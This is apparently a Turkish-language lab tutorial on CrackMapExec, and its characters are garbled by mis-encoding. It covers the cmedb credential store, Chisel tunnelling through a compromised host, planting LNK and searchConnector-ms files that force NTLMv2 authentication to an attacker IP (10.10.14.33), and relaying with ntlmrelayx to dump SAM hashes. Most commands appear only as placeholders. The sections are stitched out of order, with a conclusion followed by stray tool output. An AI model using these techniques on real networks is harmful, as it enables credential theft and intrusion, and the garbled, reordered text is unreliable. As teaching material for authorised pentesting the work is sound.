VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus

```

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

